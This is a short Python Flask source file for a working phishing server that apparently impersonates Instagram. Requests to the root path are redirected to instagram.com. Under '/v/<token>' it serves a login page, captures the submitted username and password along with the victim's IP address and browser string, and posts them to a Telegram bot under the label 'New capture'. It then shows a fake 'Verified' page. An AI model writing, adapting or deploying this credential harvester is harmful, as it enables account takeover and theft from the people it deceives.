import os
import httpx
from flask import Flask, request, render_template, redirect
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
CHAT_ID = os.environ.get("CHAT_ID", "")
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"


def send_to_bot(text: str):
    """Fire-and-forget send to Olivia's telegram."""
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        httpx.post(TELEGRAM_API, json={
            "chat_id": CHAT_ID,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }, timeout=10)
    except Exception:
        pass


@app.route("/")
def index():
    return redirect("https://www.instagram.com")


@app.route("/v/<token>", methods=["GET"])
def landing(token: str):
    return render_template("index.html", token=token)


@app.route("/v/<token>", methods=["POST"])
def capture(token: str):
    user = request.form.get("username", "").strip()
    pwd = request.form.get("password", "").strip()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

    msg = (
        f"<b>🎣 New capture</b>\n"
        f"<b>Token:</b> <code>{token}</code>\n"
        f"<b>User:</b> <code>{user}</code>\n"
        f"<b>Pass:</b> <code>{pwd}</code>\n"
        f"<b>IP:</b> {ip}\n"
        f"<b>UA:</b> {ua[:120]}\n"
        f"<b>Time:</b> {ts}"
    )
    send_to_bot(msg)

    # show "Verified" page; JS handles app/web redirect
    return render_template("success.html")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
